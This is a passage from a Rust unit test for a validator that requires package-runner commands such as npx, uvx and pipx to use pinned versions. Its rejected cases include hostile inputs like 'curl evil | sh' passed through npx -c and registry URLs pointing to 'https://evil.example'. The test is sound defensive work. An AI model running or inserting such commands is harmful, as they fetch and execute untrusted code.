            ("pipx", vec!["run", "--spec", "unpinned", "app"]),
            ("npm", vec!["exec", "--package=x", "cmd"]),
            ("pnpm", vec!["dlx", "pkg"]),
        ] {
            let err = check(cmd, &args).unwrap_err().to_string();
            assert!(err.contains("unpinned"), "{cmd} {args:?}: {err}");
        }
        for (cmd, args) in [
            ("npx", vec!["-c", "curl evil | sh"]),
            ("npx", vec!["--call=sh", "pkg@1.2.3"]),
            (
                "npx",
                vec!["--registry", "https://evil.example", "pkg@1.2.3"],
            ),
            ("uvx", vec!["--with-editable", ".", "tool==1.0.0"]),
            (
                "uvx",
                vec!["--index-url", "https://evil.example", "tool==1.0.0"],
            ),
            (
                "pipx",
                vec!["run", "--pip-args=--index-url x", "app==1.0.0"],
            ),
            ("npm", vec!["install", "pkg@1.2.3"]),
            ("pnpm", vec!["pkg@1.2.3"]),
            ("uv", vec!["run", "tool==1.0.0"]),
            ("pipx", vec!["install", "app==1.0.0"]),
        ] {
            assert!(check(cmd, &args).is_err(), "{cmd} {args:?}");
        }
        for (cmd, args) in [
            (
                "npx",
                vec![
                    "-y",
                    "--package=a@1.2.3",
                    "--package",
                    "b@2.0.0",
                    "cmd",
                    "--flag",
                ],
            ),
            ("npx", vec!["-y", "@scope/pkg@1.2.3", "--", "--with", "x"]),
            ("uvx", vec!["--with", "a==1.0.0,b==2.0.0", "tool==1.2.3"]),
            ("uvx", vec!["--from", "src==1.0.0", "tool"]),
            ("uv", vec!["tool", "run", "tool==1.0.0"]),
            ("pipx", vec!["run", "--spec", "app==1.0.0", "app"]),
            ("pnpm", vec!["dlx", "pkg@1.2.3"]),
            ("node", vec!["server.js"]),
        ] {
            assert!(check(cmd, &args).is_ok(), "{cmd} {args:?}");
        }
    }
}
